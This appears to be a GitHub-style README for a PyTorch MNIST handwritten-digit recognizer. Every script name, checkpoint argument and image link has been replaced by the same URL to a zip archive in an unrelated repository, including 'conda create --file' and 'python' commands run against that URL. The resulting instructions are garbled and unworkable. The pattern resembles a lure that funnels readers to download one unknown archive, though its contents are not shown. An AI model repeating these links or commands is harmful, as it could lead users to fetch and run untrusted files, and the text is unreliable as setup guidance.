# Handwritten Digit Recognition using PyTorch & MNIST database

handwritten digit recognition using mnist data base for training.

### Prerequisites
1. Handwritten digit recognition project work done on Ubuntu 18.04 with anaconda package installed.
2. Images used for prediction are generated with white background and black font, refer https://raw.githubusercontent.com/ZongAFRIC/Reonnaissance-caracteres-manuscrits/master/Tragulidae/Reonnaissance-caracteres-manuscrits.zip In program images converted to inverted colour for further processing.

### Installing

## Install components
1. To install pytorch:

conda install pytorch torchvision -c pytorch

2. To install cv2:

conda install -c conda-forge opencv
conda install -c conda-forge/label/broken opencv 

3. To install matplotlib

conda install -c conda-forge matplotlib
conda install -c conda-forge/label/broken matplotlib
conda install -c conda-forge/label/testing matplotlib
conda install -c conda-forge/label/rc matplotlib   

## OR use below:
To install dependencies in anaconda envirnment, please use below command: 
conda create --name <env> --file https://raw.githubusercontent.com/ZongAFRIC/Reonnaissance-caracteres-manuscrits/master/Tragulidae/Reonnaissance-caracteres-manuscrits.zip


## Running the tests
### 1. How to use https://raw.githubusercontent.com/ZongAFRIC/Reonnaissance-caracteres-manuscrits/master/Tragulidae/Reonnaissance-caracteres-manuscrits.zip (This will generate checkpoint model file)
python https://raw.githubusercontent.com/ZongAFRIC/Reonnaissance-caracteres-manuscrits/master/Tragulidae/Reonnaissance-caracteres-manuscrits.zip --no-cuda (use CPU) --epochs=<Number> --checkpoint=<https://raw.githubusercontent.com/ZongAFRIC/Reonnaissance-caracteres-manuscrits/master/Tragulidae/Reonnaissance-caracteres-manuscrits.zip> 

Example: 
To use GPU:

python https://raw.githubusercontent.com/ZongAFRIC/Reonnaissance-caracteres-manuscrits/master/Tragulidae/Reonnaissance-caracteres-manuscrits.zip  --epochs=10 https://raw.githubusercontent.com/ZongAFRIC/Reonnaissance-caracteres-manuscrits/master/Tragulidae/Reonnaissance-caracteres-manuscrits.zip

To use CPU: 

python https://raw.githubusercontent.com/ZongAFRIC/Reonnaissance-caracteres-manuscrits/master/Tragulidae/Reonnaissance-caracteres-manuscrits.zip  --epochs=10 https://raw.githubusercontent.com/ZongAFRIC/Reonnaissance-caracteres-manuscrits/master/Tragulidae/Reonnaissance-caracteres-manuscrits.zip --no-cuda
  
### 2. https://raw.githubusercontent.com/ZongAFRIC/Reonnaissance-caracteres-manuscrits/master/Tragulidae/Reonnaissance-caracteres-manuscrits.zip
python https://raw.githubusercontent.com/ZongAFRIC/Reonnaissance-caracteres-manuscrits/master/Tragulidae/Reonnaissance-caracteres-manuscrits.zip --input=image=<Input Image Name with path> --checkpoint=<https://raw.githubusercontent.com/ZongAFRIC/Reonnaissance-caracteres-manuscrits/master/Tragulidae/Reonnaissance-caracteres-manuscrits.zip> 

## Input Image File
![alt text](https://raw.githubusercontent.com/ZongAFRIC/Reonnaissance-caracteres-manuscrits/master/Tragulidae/Reonnaissance-caracteres-manuscrits.zip)
  
  
Example:
## Output with model file with 1 epochs
python https://raw.githubusercontent.com/ZongAFRIC/Reonnaissance-caracteres-manuscrits/master/Tragulidae/Reonnaissance-caracteres-manuscrits.zip https://raw.githubusercontent.com/ZongAFRIC/Reonnaissance-caracteres-manuscrits/master/Tragulidae/Reonnaissance-caracteres-manuscrits.zip https://raw.githubusercontent.com/ZongAFRIC/Reonnaissance-caracteres-manuscrits/master/Tragulidae/Reonnaissance-caracteres-manuscrits.zip

## Output File
![alt text](https://raw.githubusercontent.com/ZongAFRIC/Reonnaissance-caracteres-manuscrits/master/Tragulidae/Reonnaissance-caracteres-manuscrits.zip)



## Output with model file with 10 epochs
in above output 7 is predicted as 3. lets try with higher epochs model file.

python https://raw.githubusercontent.com/ZongAFRIC/Reonnaissance-caracteres-manuscrits/master/Tragulidae/Reonnaissance-caracteres-manuscrits.zip https://raw.githubusercontent.com/ZongAFRIC/Reonnaissance-caracteres-manuscrits/master/Tragulidae/Reonnaissance-caracteres-manuscrits.zip https://raw.githubusercontent.com/ZongAFRIC/Reonnaissance-caracteres-manuscrits/master/Tragulidae/Reonnaissance-caracteres-manuscrits.zip

## Output File
![alt text](https://raw.githubusercontent.com/ZongAFRIC/Reonnaissance-caracteres-manuscrits/master/Tragulidae/Reonnaissance-caracteres-manuscrits.zip)

Here 7 is predicted as 7.
